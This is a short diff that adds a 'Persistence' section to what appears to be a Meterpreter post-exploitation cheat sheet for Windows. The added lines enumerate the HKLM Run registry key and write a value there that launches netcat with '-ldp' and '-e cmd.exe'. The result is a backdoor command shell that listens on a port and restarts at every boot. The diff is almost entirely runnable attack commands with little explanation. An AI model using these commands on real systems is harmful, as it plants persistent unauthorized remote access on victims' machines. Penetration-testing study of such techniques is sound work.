@@ -12,3 +12,9 @@ run post/multi/recon/local_exploit_suggester
 
 // Get privileges of current users
 getprivs
+
+// Persistence
+// Upload executable netcat to victim
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d '<Netcat executable with path> -ldp <port number> -e cmd.exe'
